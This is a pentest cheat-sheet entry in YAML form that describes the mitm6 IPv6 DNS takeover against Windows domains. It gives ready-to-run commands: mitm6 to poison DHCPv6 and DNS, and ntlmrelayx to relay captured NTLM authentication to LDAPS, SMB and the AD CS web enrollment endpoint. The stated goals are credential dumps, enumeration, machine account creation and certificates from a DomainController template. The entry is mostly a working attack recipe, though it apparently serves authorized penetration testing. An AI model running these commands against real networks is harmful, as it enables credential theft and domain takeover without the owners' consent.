---
description: |
  mitm6 IPv6 DNS takeover — abuse Windows default IPv6 configuration to intercept DHCP/WPAD requests and relay NTLM authentication to LDAP for credential theft or machine account creation.
commands:
  - have: No_Creds
    cmd: |
      # Terminal 1 — Start mitm6 to poison IPv6 DNS
      mitm6 -d senshu.sh

      # Terminal 2 — Relay captured NTLM auth to LDAP/LDAPS
      ntlmrelayx.py -6 -t ldaps://10.10.10.27 -wh fakewpad.senshu.sh -l loot

      # Wait for DHCP/WPAD requests from Windows hosts
      # mitm6 responds to DHCPv6 requests, setting attacker as DNS server
      # Victims query WPAD via the attacker's DNS → triggers NTLM auth
      # ntlmrelayx relays the authentication to LDAP

      # Results are saved in the 'loot' directory:
      # - Domain user/group/computer enumeration
      # - Delegated machine account creation
      # - Credential dumps from LDAP

      # Note: pair with ntlmrelayx for LDAP relay to create computer accounts or dump credentials
      # Can also relay to other services:
      ntlmrelayx.py -6 -t smb://10.10.10.27 -wh fakewpad.senshu.sh -socks
      ntlmrelayx.py -6 -t http://10.10.10.27/certsrv/certfnsh.asp -wh fakewpad.senshu.sh --adcs --template DomainController
phase:
  - Exploitation
target_os:
  - Windows
services:
  - LDAP
techniques:
  - NTLM_Relay
references:
  - https://github.com/dirkjanm/mitm6
  - https://github.com/fortra/impacket
  - https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html
---
